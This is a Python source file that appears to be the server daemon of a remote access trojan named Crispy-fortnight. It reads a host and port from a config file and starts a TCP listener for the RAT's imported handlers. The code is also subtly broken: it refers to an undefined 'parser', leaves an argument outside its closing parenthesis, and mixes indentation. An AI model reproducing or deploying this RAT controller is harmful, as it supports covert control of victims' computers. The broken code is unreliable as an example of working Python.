import argparse
import logging
import ConfigParser

from crispy.network.server_handler import CrispyTCPServerHandler
from crispy.lib.server import CrispyTCPServer
    
def main():
    argp = argparse.ArgumentParser(description="Crispy-fortnight (Python RAT) daemon console.",
                                   epilog="Do NOT use this for nefarious purposes!", 
                                   prog="crispyd")
    argp.add_argument("--config",
                        dest="config_file",
                        help="Path to crispy config file",
                        metavar="CONFIG_FILE",
                        required=True,
                        type=str)
    parser.add_argument('--loglevel',
			help="Change log verbosity",
			choices=["DEBUG", "ERROR", "INFO", "WARNING"],
			default="WARNING")
			dest="loglevel",
    argp.add_argument('--version', 
                        action='version', 
                        version='1.0')
    args = argp.parse_args()
    
    if args.loglevel=="ERROR":
	loglevel=logging.ERROR
    elif args.loglevel=="DEBUG":
	loglevel=logging.DEBUG
    elif args.loglevel=="INFO":
	loglevel=logging.INFO
    else:
	loglevel=logging.WARNING

    logging.basicConfig(format='%(asctime)-15s - %(levelname)-5s - %(message)s')
    logging.getLogger().setLevel(loglevel)

    config = ConfigParser.ConfigParser()
    config.read(args.config_file)
    
    host = config.get('NETWORK', 'host')
    port = config.getint('NETWORK', 'port')

    logging.basicConfig(filename='crispy.log', level=logging.DEBUG)
    
    try:
        server = CrispyTCPServer((host, port), CrispyTCPServerHandler)
        logging.debug("Started server on {0}:{1}".format(server.server_address[0], server.server_address[1]))
        server.serve_forever()
    except KeyboardInterrupt:
        logging.debug("Shutting down server")
        logging.shutdown()
        server.shutdown()
        server.socket.close()
 
if __name__ == "__main__":
    main()
